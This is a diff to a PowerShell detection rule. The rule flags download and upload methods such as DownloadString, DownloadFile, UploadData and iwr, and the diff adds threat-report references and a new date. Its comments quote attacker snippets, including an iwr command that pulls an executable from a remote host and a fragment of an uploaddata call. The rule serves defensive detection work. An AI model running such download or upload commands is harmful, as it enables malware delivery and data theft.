@@ -6,6 +6,8 @@ body: |-
   status: stable
   description: By leveraging a combination of indicators, the rule aims to flag instances where possible malicious actors may be attempting to download malicious content (as like next stage of malware) or upload confidential data (through the use of automated processing after being gathered during Collection tactic) via PowerShell. For instance, it targets specific PowerShell methods such as DownloadString, UploadData, etc. which are commonly associated with downloading or uploading activities in malicious scripts or hands-on post-exploitation actions. The reliance on the surrounding environment may necessitate the implementation of additional filtering (for legitimate administrative scripts and processes) measures to prevent false positives.
   references:
+      - https://efficientip.com/blog/clickfix-netsupport-rat/
+      - https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/
       - https://www.security.com/threat-intelligence/openai-claude-unauthorized-relays
       - https://www.zscaler.com/blogs/security-research/seo-poisoning-campaign-delivers-new-armorsteal-malware
       - https://socradar.io/blog/inc-gentlemen-ransomware-ai-infrastructure/
@@ -329,7 +331,7 @@ body: |-
       selection2:
           CommandLine|contains:
               - '.DownloadData' #https://cert.gov.ua/article/6281681; https://blog.deception.pro/blog/clickfix-hok-velvet-tempest-termite; https://www.esentire.com/blog/malware-as-a-service-cocktail-errtraffic-and-cruciferra-killing-your-edr-since-2025
-              - '.DownloadString' #https://cert.gov.ua/article/6282902; https://asec.ahnlab.com/en/91166/; https://detect.fyi/playbook-hunting-chinese-apt-379a6b950492; https://hunt.io/blog/iranian-nexus-oman-government-intrusion; https://www.security.com/threat-intelligence/iran-seedworm-electronics; https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline; https://www.zscaler.com/blogs/security-research/seo-poisoning-campaign-delivers-new-armorsteal-malware
+              - '.DownloadString' #https://cert.gov.ua/article/6282902; https://asec.ahnlab.com/en/91166/; https://detect.fyi/playbook-hunting-chinese-apt-379a6b950492; https://hunt.io/blog/iranian-nexus-oman-government-intrusion; https://www.security.com/threat-intelligence/iran-seedworm-electronics; https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline; https://www.zscaler.com/blogs/security-research/seo-poisoning-campaign-delivers-new-armorsteal-malware; https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/
               - '.DownloadFile' #https://www.picussecurity.com/resource/blog/xhunt-apt-cyber-espionage-operations-targeting-kuwait-and-exchange-servers; # https://www.pointwild.com/threat-intelligence/covert-rat-phishing-campaign/; https://www.bitsight.com/blog/ransomware-twizt-inside-phorpiex-botnet; https://thehackernews.com/2026/05/daemon-tools-supply-chain-attack.html; https://asec.ahnlab.com/en/94685/; https://www.securonix.com/blog/smoke-screen-screenconnect-rmm-abuse-cloudflare-tunnels/; https://www.rstcloud.com/ftp-banner-dead-drops-a-hunters-field-guide-to-e4del-and-pinhole/
               - '.UploadString'
               - '.uploaddata' #..net.webclient;$ujk.uploaddata('http:/...
@@ -338,7 +340,7 @@ body: |-
       selection3:
           - CommandLine|contains|all:
               #- 'powershell'
-              - 'iwr ' #...iwr http://xxx.pl/grafika/docx.exe -OutFile "C:\Users\$ENV:UserName\docx.exe";...'; https://cert.gov.ua/article/6282902; https://www.picussecurity.com/resource/blog/fog-ransomware-2025-deep-dive-into-ttps; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/; https://www.trendmicro.com/en_us/research/26/a/analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html; https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/; https://www.elastic.co/security-labs/phantom-in-the-vault; https://arcticwolf.com/resources/blog/bluenoroff-uses-clickfix-fileless-powershell-and-ai-generated-zoom-meetings-to-target-web3-sector/; https://asec.ahnlab.com/en/94995/; https://www.elastic.co/security-labs/threat-command/malicious-browser-extension-kremlin-banking-malware; https://asec.ahnlab.com/en/95516/
+              - 'iwr ' #...iwr http://xxx.pl/grafika/docx.exe -OutFile "C:\Users\$ENV:UserName\docx.exe";...'; https://cert.gov.ua/article/6282902; https://www.picussecurity.com/resource/blog/fog-ransomware-2025-deep-dive-into-ttps; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/; https://www.trendmicro.com/en_us/research/26/a/analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html; https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/; https://www.elastic.co/security-labs/phantom-in-the-vault; https://arcticwolf.com/resources/blog/bluenoroff-uses-clickfix-fileless-powershell-and-ai-generated-zoom-meetings-to-target-web3-sector/; https://asec.ahnlab.com/en/94995/; https://www.elastic.co/security-labs/threat-command/malicious-browser-extension-kremlin-banking-malware; https://asec.ahnlab.com/en/95516/; https://efficientip.com/blog/clickfix-netsupport-rat/
               - 'http'
           - CommandLine|contains|all:
               #- 'powershell'
@@ -401,4 +403,4 @@ body: |-
   level: high
 level: high
 created: '2020-03-24T12:46:08Z'
-updated: '2026-10-29T12:01:17.740000Z'
+updated: '2026-11-16T12:29:01.191000Z'
